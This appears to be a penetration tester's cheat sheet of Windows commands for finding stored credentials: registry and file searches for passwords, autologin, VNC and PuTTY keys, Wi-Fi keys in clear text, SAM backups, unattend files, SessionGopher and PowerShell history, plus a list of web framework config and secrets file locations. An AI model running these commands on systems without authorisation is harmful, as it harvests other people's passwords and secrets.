



```powershell
# General Searches
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*

# For a certain name
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

Use Snaffpoint for Sharepoint if needed: https://github.com/nheiniger/SnaffPoint

# Registry searches
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattend files
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# IIS Web config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

# Other files
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b


# Wifi Passwords
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on


Sticky Notes passwords
\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

# Passwords stored in services
## Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

Passwords stored in Key Manager (Will pop up in GUI)
rundll32 keymgr,KRShowKeyMgr


Find git repositories 
dir /s /b .git
# or PowerShell
Get-ChildItem -Path C:\ -Filter .git -Recurse -ErrorAction SilentlyContinue -Directory
# or
Get-ChildItem -Path C:\ -Filter *.git -Recurse -ErrorAction SilentlyContinue -Directory

find / -name ".git" -type d 2>/dev/null
# or
find / -name "*.git" -type d 2>/dev/null


# Powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw

# Powershell Transcript
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt


# Password in Alternate Data Stream
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag




```


Web server and their file locations:
```
Apache HTTPD
    Main config: /etc/apache2/apache2.conf or /etc/httpd/conf/httpd.conf
    Password file (if used): location defined for .htpasswd

Nginx

    Main config: /etc/nginx/nginx.conf
    Password file: as set by the auth_basic_user_file directive

IIS

    Global config: %windir%\System32\inetsrv\config\applicationHost.config
    Site config: individual web.config files

Flask (Python)
    Common config: config.py (or instance/config.py)
    Often uses: .env for environment variables

Django (Python)
    Config file: settings.py
Ruby on Rails
    Database: config/database.yml
    Secrets: config/credentials.yml.enc (or older config/secrets.yml)
Express (Node.js)
    Typically uses: a .env file or custom config files (e.g. config.js)
Laravel (PHP)
    Main config: .env
Symfony (PHP)
    Main config: .env
    Older versions: app/config/parameters.yml

CodeIgniter (PHP)
    Config file: application/config/database.php

Spring Boot (Java)
    Config files: src/main/resources/application.properties or application.yml

Apache Tomcat
    User credentials: conf/tomcat-users.xml
    Sometimes passwords in: conf/server.xml

WordPress (PHP)
    Config file: wp-config.php
Joomla (PHP)
    Config file: configuration.php
Drupal (PHP)
    Config file: sites/default/settings.php
Meteor (Node.js)
    If used: settings.json

```